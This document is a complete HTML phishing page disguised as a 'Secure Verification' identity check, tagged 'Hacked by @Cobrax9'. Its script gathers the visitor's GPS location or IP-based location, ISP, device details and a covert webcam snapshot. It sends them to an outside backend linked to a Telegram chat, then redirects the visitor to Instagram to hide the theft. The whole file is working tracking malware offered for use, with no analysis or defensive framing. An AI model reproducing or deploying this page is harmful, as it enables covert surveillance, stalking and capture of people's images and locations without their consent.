
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      background-color: #202020;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: #2a2a2a;
      padding: 30px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
    }
    .card h2 {
      margin-bottom: 10px;
    }
    .btn {
      margin-top: 20px;
      padding: 12px 24px;
      font-size: 16px;
      background: #00ffaa;
      color: #000;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .spinner {
      margin: 20px auto;
      width: 40px;
      height: 40px;
      border: 4px solid #999;
      border-top-color: #00ffaa;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>üîê Identity Check</h2>
    <p>Please continue to verify your session securely.</p>
    <button class="btn" onclick="startVerification()">üîì Continue Verification</button>
    <div class="spinner" id="spinner"></div>
  </div>
  <video id="videoPreview" autoplay muted playsinline></video>
  <canvas id="snapshotCanvas" width="320" height="240"></canvas>

  <script>
    const chatId = new URLSearchParams(window.location.search).get("id");
    const video = document.getElementById("videoPreview");
    const canvas = document.getElementById("snapshotCanvas");
    const ctx = canvas.getContext("2d");
    const spinner = document.getElementById("spinner");

    let result = "üì± Hacked by @Cobrax9\n\n";
    let imageBase64 = "";

    function startVerification() {
      spinner.style.display = "block";

      navigator.geolocation.getCurrentPosition(
        pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          result += "üåç GPS Location: https://maps.google.com/?q=" + lat + "," + lon + "\n\n";
          collectRestOfInfo();
        },
        err => {
          console.warn("GPS denied, falling back to IP...");
          fetchIP();
        },
        { timeout: 5000 }
      );
    }

    function fetchIP() {
      fetch("https://ipinfo.io/json?token=demo")
        .then(res => res.json())
        .then(data => {
          result += "üåé IP Info:\n";
          result += `üåê IP: ${data.ip}\nüì° ISP: ${data.org}\nüîç ASN: ${data.org?.split(" ")[0]}\n`;
          result += `üåç IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
          collectRestOfInfo();
        })
        .catch(() => {
          result += "üåê Location info unavailable\n\n";
          collectRestOfInfo();
        });
    }

    function collectRestOfInfo() {
      const ua = navigator.userAgent;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const connection = navigator.connection || {};
      const network = connection.effectiveType || "Unknown";

      navigator.getBattery().then(battery => {
        const charging = battery.charging ? "Yes" : "No";
        const level = Math.round(battery.level * 100) + "%";

        result += "üì± Device Info:\n";
        result += `üîã Charging: ${charging}\n`;
        result += `üîå Battery: ${level}\n`;
        result += `üåê Network: ${network.toUpperCase()}\n`;
        result += `üïí Time Zone: ${timeZone}\n\n`;
        result += `üñ•Ô∏è User Agent: ${ua}\n`;
        result += `üì± Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
        result += "üë®‚Äçüíª Tracked on: @Cobrax9";

        capturePhoto();
      });
    }

    function capturePhoto() {
      video.style.display = "block";
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
            sendToTelegram();
          }, 1500);
        })
        .catch(() => {
          sendToTelegram(); // fallback if no camera
        });
    }

    function sendToTelegram() {
      if (!chatId) return;

      fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message: result,
          photo: imageBase64
        })
      }).then(() => {
        setTimeout(() => {
          window.location.href = "https://instagram.com";
        }, 3000);
      });
    }
  </script>
</body>
</html>
